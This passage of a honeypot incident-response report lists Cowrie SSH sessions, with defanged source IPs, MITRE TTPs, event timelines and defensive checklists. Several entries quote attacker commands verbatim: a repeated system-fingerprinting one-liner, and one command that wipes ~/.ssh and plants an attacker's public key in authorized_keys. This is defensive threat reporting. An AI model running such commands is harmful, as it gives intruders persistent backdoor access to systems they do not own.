- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff997127c6a1

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-19 05:54 |
| **Last Seen** | 2026-07-19 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:54:10` | `cowrie.session.connect` |
| `2026-07-19 05:54:10` | `cowrie.client.version` |
| `2026-07-19 05:54:10` | `cowrie.client.kex` |
| `2026-07-19 05:54:11` | `cowrie.login.success` |
| `2026-07-19 05:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61e97b3cb4f6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-19 05:54 |
| **Last Seen** | 2026-07-19 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:54:10` | `cowrie.session.connect` |
| `2026-07-19 05:54:10` | `cowrie.client.version` |
| `2026-07-19 05:54:11` | `cowrie.client.kex` |
| `2026-07-19 05:54:11` | `cowrie.login.success` |
| `2026-07-19 05:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a918a6bd8915

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:55 |
| **Last Seen** | 2026-07-19 05:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:55:45` | `cowrie.session.connect` |
| `2026-07-19 05:55:46` | `cowrie.client.version` |
| `2026-07-19 05:55:46` | `cowrie.client.kex` |
| `2026-07-19 05:55:47` | `cowrie.login.success` |
| `2026-07-19 05:55:48` | `cowrie.session.params` |
| `2026-07-19 05:55:48` | `cowrie.command.input` |
| `2026-07-19 05:55:48` | `cowrie.command.input` |
| `2026-07-19 05:55:48` | `cowrie.command.input` |
| `2026-07-19 05:55:48` | `cowrie.command.input` |
| `2026-07-19 05:55:48` | `cowrie.command.input` |
| `2026-07-19 05:55:48` | `cowrie.command.success` |
| `2026-07-19 05:55:48` | `cowrie.command.input` |
| `2026-07-19 05:55:48` | `cowrie.command.input` |
| `2026-07-19 05:55:48` | `cowrie.command.input` |
| `2026-07-19 05:55:48` | `cowrie.command.input` |
| `2026-07-19 05:55:49` | `cowrie.log.closed` |
| `2026-07-19 05:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe0d55e67fa7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-19 05:55 |
| **Last Seen** | 2026-07-19 05:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:55:53` | `cowrie.session.connect` |
| `2026-07-19 05:55:53` | `cowrie.client.version` |
| `2026-07-19 05:55:53` | `cowrie.client.kex` |
| `2026-07-19 05:55:53` | `cowrie.login.success` |
| `2026-07-19 05:55:53` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:55:53` | `cowrie.direct-tcpip.ja4` |
| `2026-07-19 05:55:53` | `cowrie.direct-tcpip.data` |
| `2026-07-19 05:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-477f3a2f4b10

| Field | Detail |
|---|---|
| **Source IP** | `46.24.47[.]94` |
| **First Seen** | 2026-07-19 05:56 |
| **Last Seen** | 2026-07-19 05:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:56:55` | `cowrie.session.connect` |
| `2026-07-19 05:56:55` | `cowrie.client.version` |
| `2026-07-19 05:56:55` | `cowrie.client.kex` |
| `2026-07-19 05:56:56` | `cowrie.login.success` |
| `2026-07-19 05:56:56` | `cowrie.session.params` |
| `2026-07-19 05:56:56` | `cowrie.command.input` |
| `2026-07-19 05:56:56` | `cowrie.command.failed` |
| `2026-07-19 05:56:57` | `cowrie.log.closed` |
| `2026-07-19 05:56:57` | `cowrie.session.params` |
| `2026-07-19 05:56:57` | `cowrie.command.input` |
| `2026-07-19 05:56:57` | `cowrie.session.file_download` |
| `2026-07-19 05:56:57` | `cowrie.log.closed` |
| `2026-07-19 05:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.24.47[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.24.47[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d52604a0c2f

| Field | Detail |
|---|---|
| **Source IP** | `46.24.47[.]94` |
| **First Seen** | 2026-07-19 05:56 |
| **Last Seen** | 2026-07-19 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:56:57` | `cowrie.session.connect` |
| `2026-07-19 05:56:57` | `cowrie.client.version` |
| `2026-07-19 05:56:58` | `cowrie.client.kex` |
| `2026-07-19 05:56:58` | `cowrie.login.success` |
| `2026-07-19 05:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.24.47[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.24.47[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a419ea190f1

| Field | Detail |
|---|---|
| **Source IP** | `46.24.47[.]94` |
| **First Seen** | 2026-07-19 05:56 |
| **Last Seen** | 2026-07-19 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:56:58` | `cowrie.session.connect` |
| `2026-07-19 05:56:58` | `cowrie.client.version` |
| `2026-07-19 05:56:58` | `cowrie.client.kex` |
| `2026-07-19 05:56:59` | `cowrie.login.success` |
| `2026-07-19 05:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.24.47[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.24.47[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5e6cbc243cb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-19 05:57 |
| **Last Seen** | 2026-07-19 05:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:57:18` | `cowrie.session.connect` |
| `2026-07-19 05:57:18` | `cowrie.client.version` |
| `2026-07-19 05:57:18` | `cowrie.client.kex` |
| `2026-07-19 05:57:18` | `cowrie.login.success` |
| `2026-07-19 05:57:18` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:57:18` | `cowrie.direct-tcpip.ja4` |
| `2026-07-19 05:57:18` | `cowrie.direct-tcpip.data` |
| `2026-07-19 05:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1d70369fdf2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:57 |
| **Last Seen** | 2026-07-19 05:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:57:26` | `cowrie.session.connect` |
| `2026-07-19 05:57:26` | `cowrie.client.version` |
| `2026-07-19 05:57:26` | `cowrie.client.kex` |
| `2026-07-19 05:57:28` | `cowrie.login.success` |
| `2026-07-19 05:57:29` | `cowrie.session.params` |
| `2026-07-19 05:57:29` | `cowrie.command.input` |
| `2026-07-19 05:57:29` | `cowrie.command.input` |
| `2026-07-19 05:57:29` | `cowrie.command.input` |
| `2026-07-19 05:57:29` | `cowrie.command.input` |
| `2026-07-19 05:57:29` | `cowrie.command.input` |
| `2026-07-19 05:57:29` | `cowrie.command.success` |
| `2026-07-19 05:57:29` | `cowrie.command.input` |
| `2026-07-19 05:57:29` | `cowrie.command.input` |
| `2026-07-19 05:57:29` | `cowrie.command.input` |
| `2026-07-19 05:57:29` | `cowrie.command.input` |
| `2026-07-19 05:57:30` | `cowrie.log.closed` |
| `2026-07-19 05:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61a1597f8b75

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:59 |
| **Last Seen** | 2026-07-19 05:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:59:09` | `cowrie.session.connect` |
| `2026-07-19 05:59:09` | `cowrie.client.version` |
| `2026-07-19 05:59:09` | `cowrie.client.kex` |
| `2026-07-19 05:59:10` | `cowrie.login.success` |
| `2026-07-19 05:59:11` | `cowrie.session.params` |
| `2026-07-19 05:59:11` | `cowrie.command.input` |
| `2026-07-19 05:59:11` | `cowrie.command.input` |
| `2026-07-19 05:59:11` | `cowrie.command.input` |
| `2026-07-19 05:59:11` | `cowrie.command.input` |
| `2026-07-19 05:59:11` | `cowrie.command.input` |
| `2026-07-19 05:59:11` | `cowrie.command.success` |
| `2026-07-19 05:59:11` | `cowrie.command.input` |
| `2026-07-19 05:59:11` | `cowrie.command.input` |
| `2026-07-19 05:59:11` | `cowrie.command.input` |
| `2026-07-19 05:59:11` | `cowrie.command.input` |
| `2026-07-19 05:59:12` | `cowrie.log.closed` |
| `2026-07-19 05:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1ddc4c0628

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:00 |
| **Last Seen** | 2026-07-19 06:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:00:51` | `cowrie.session.connect` |
| `2026-07-19 06:00:51` | `cowrie.client.version` |
| `2026-07-19 06:00:51` | `cowrie.client.kex` |
| `2026-07-19 06:00:53` | `cowrie.login.success` |
| `2026-07-19 06:00:54` | `cowrie.session.params` |
| `2026-07-19 06:00:54` | `cowrie.command.input` |
| `2026-07-19 06:00:54` | `cowrie.command.input` |
| `2026-07-19 06:00:54` | `cowrie.command.input` |
| `2026-07-19 06:00:54` | `cowrie.command.input` |
| `2026-07-19 06:00:54` | `cowrie.command.input` |
| `2026-07-19 06:00:54` | `cowrie.command.success` |
| `2026-07-19 06:00:54` | `cowrie.command.input` |
| `2026-07-19 06:00:54` | `cowrie.command.input` |
| `2026-07-19 06:00:54` | `cowrie.command.input` |
| `2026-07-19 06:00:54` | `cowrie.command.input` |
| `2026-07-19 06:00:54` | `cowrie.log.closed` |
| `2026-07-19 06:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9e81e98b4c3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:02 |
| **Last Seen** | 2026-07-19 06:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:02:36` | `cowrie.session.connect` |
| `2026-07-19 06:02:36` | `cowrie.client.version` |
| `2026-07-19 06:02:36` | `cowrie.client.kex` |
| `2026-07-19 06:02:37` | `cowrie.login.success` |
| `2026-07-19 06:02:38` | `cowrie.session.params` |
| `2026-07-19 06:02:38` | `cowrie.command.input` |
| `2026-07-19 06:02:38` | `cowrie.command.input` |
| `2026-07-19 06:02:38` | `cowrie.command.input` |
| `2026-07-19 06:02:38` | `cowrie.command.input` |
| `2026-07-19 06:02:38` | `cowrie.command.input` |
| `2026-07-19 06:02:38` | `cowrie.command.success` |
| `2026-07-19 06:02:38` | `cowrie.command.input` |
| `2026-07-19 06:02:38` | `cowrie.command.input` |
| `2026-07-19 06:02:38` | `cowrie.command.input` |
| `2026-07-19 06:02:38` | `cowrie.command.input` |
| `2026-07-19 06:02:39` | `cowrie.log.closed` |
| `2026-07-19 06:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1e9df1ebfd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:04 |
| **Last Seen** | 2026-07-19 06:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:04:24` | `cowrie.session.connect` |
| `2026-07-19 06:04:24` | `cowrie.client.version` |
| `2026-07-19 06:04:24` | `cowrie.client.kex` |
| `2026-07-19 06:04:25` | `cowrie.login.success` |
| `2026-07-19 06:04:27` | `cowrie.session.params` |
| `2026-07-19 06:04:27` | `cowrie.command.input` |
| `2026-07-19 06:04:27` | `cowrie.command.input` |
| `2026-07-19 06:04:27` | `cowrie.command.input` |
| `2026-07-19 06:04:27` | `cowrie.command.input` |
| `2026-07-19 06:04:27` | `cowrie.command.input` |
| `2026-07-19 06:04:27` | `cowrie.command.success` |
| `2026-07-19 06:04:27` | `cowrie.command.input` |
| `2026-07-19 06:04:27` | `cowrie.command.input` |
| `2026-07-19 06:04:27` | `cowrie.command.input` |
| `2026-07-19 06:04:27` | `cowrie.command.input` |
| `2026-07-19 06:04:27` | `cowrie.log.closed` |
| `2026-07-19 06:04:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e52ee42b111b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:06 |
| **Last Seen** | 2026-07-19 06:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:06:14` | `cowrie.session.connect` |
| `2026-07-19 06:06:14` | `cowrie.client.version` |
| `2026-07-19 06:06:14` | `cowrie.client.kex` |
| `2026-07-19 06:06:16` | `cowrie.login.success` |
| `2026-07-19 06:06:17` | `cowrie.session.params` |
| `2026-07-19 06:06:17` | `cowrie.command.input` |
| `2026-07-19 06:06:17` | `cowrie.command.input` |
| `2026-07-19 06:06:17` | `cowrie.command.input` |
| `2026-07-19 06:06:17` | `cowrie.command.input` |
| `2026-07-19 06:06:17` | `cowrie.command.input` |
| `2026-07-19 06:06:17` | `cowrie.command.success` |
| `2026-07-19 06:06:17` | `cowrie.command.input` |
| `2026-07-19 06:06:17` | `cowrie.command.input` |
| `2026-07-19 06:06:17` | `cowrie.command.input` |
| `2026-07-19 06:06:17` | `cowrie.command.input` |
| `2026-07-19 06:06:17` | `cowrie.log.closed` |
| `2026-07-19 06:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-220a0616e6ac

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 06:08 |
| **Last Seen** | 2026-07-19 06:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:08:01` | `cowrie.session.connect` |
| `2026-07-19 06:08:02` | `cowrie.client.version` |
| `2026-07-19 06:08:02` | `cowrie.client.kex` |
| `2026-07-19 06:08:03` | `cowrie.login.success` |
| `2026-07-19 06:08:04` | `cowrie.session.params` |
| `2026-07-19 06:08:04` | `cowrie.command.input` |
| `2026-07-19 06:08:04` | `cowrie.command.input` |
| `2026-07-19 06:08:04` | `cowrie.command.input` |
| `2026-07-19 06:08:04` | `cowrie.command.input` |
| `2026-07-19 06:08:04` | `cowrie.command.input` |
| `2026-07-19 06:08:04` | `cowrie.command.success` |
| `2026-07-19 06:08:04` | `cowrie.command.input` |
| `2026-07-19 06:08:04` | `cowrie.command.input` |
| `2026-07-19 06:08:04` | `cowrie.command.input` |
| `2026-07-19 06:08:04` | `cowrie.command.input` |
| `2026-07-19 06:08:05` | `cowrie.log.closed` |
| `2026-07-19 06:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91d89b8a4b45

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-19 06:08 |
| **Last Seen** | 2026-07-19 06:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 06:08:37` | `cowrie.session.connect` |
| `2026-07-19 06:08:38` | `cowrie.client.version` |
| `2026-07-19 06:08:38` | `cowrie.client.kex` |
| `2026-07-19 06:08:40` | `cowrie.login.success` |
| `2026-07-19 06:08:40` | `cowrie.direct-tcpip.request` |
| `2026-07-19 06:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
